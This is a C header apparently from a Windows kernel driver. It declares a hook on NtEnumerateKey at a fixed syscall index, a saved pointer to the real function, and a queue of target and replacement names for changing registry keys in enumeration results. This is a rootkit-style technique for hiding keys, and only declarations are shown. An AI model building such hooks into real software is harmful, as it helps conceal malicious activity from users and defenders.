#ifndef _KEY_H_
#define _KEY_H_
#include "inc.h"

#define NUMBER_NT_ENUMERATE_KEY  0x47

typedef NTSTATUS(*NT_ENUMERATE_KEY)(
	HANDLE                KeyHandle,
	ULONG                 Index,
	KEY_INFORMATION_CLASS KeyInformationClass,
	PVOID                 KeyInformation,
	ULONG                 Length,
	PULONG                ResultLength
	);

typedef struct _TASK_QUEUE_KEY {
	PWCHAR target;
	PWCHAR change;
	LIST_ENTRY link;
} TASK_QUEUE_KEY, *PTASK_QUEUE_KEY;
LIST_ENTRY glTaskQueueKey;
PAGED_LOOKASIDE_LIST glPagedTaskQueueKey;

NT_ENUMERATE_KEY glRealNtEnumerateKey;

NTSTATUS NTAPI HookNtEnumerateKey(
	HANDLE                KeyHandle,
	ULONG                 Index,
	KEY_INFORMATION_CLASS KeyInformationClass,
	PVOID                 KeyInformation,
	ULONG                 Length,
	PULONG                ResultLength
);


VOID ChangeKey(KEY_INFORMATION_CLASS KeyInformationClass, PVOID KeyInformation);
VOID TaskQueueByKey(PCHAR target, PCHAR add);
VOID FreeTaskQueueKeyList();
VOID PrintTaskQueueKeyList();

#endif // !_KEY_H_
